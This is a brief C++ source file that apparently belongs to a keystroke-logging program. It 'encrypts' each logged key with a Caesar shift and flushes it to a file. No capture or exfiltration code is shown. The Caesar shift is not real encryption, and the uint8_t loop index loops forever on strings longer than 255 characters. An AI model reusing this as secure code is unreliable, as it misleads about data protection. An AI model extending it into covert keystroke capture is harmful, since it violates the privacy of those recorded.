#include "../include/EncryptedLogStrategy.h"

// initialize the shiftAmount used for Caesar cipher encryption
EncryptedLogStrategy::EncryptedLogStrategy(uint8_t shiftAmount) :
                shiftAmount(shiftAmount) {}

// The encryption shifts the character by the shiftAmount
std::string EncryptedLogStrategy::caesarEncryption(std::string key)
{
    for(uint8_t index = 0; index < key.length(); ++index)
    {
        key.data()[index] += shiftAmount;
    }

    return key;
}

// The key is encrypted before being written to the logfile
void EncryptedLogStrategy::log(std::string key, std::ofstream& logfile) 
{
    logfile << this->caesarEncryption(key);
    logfile.flush(); // Ensure the key is written immediately to the file
}
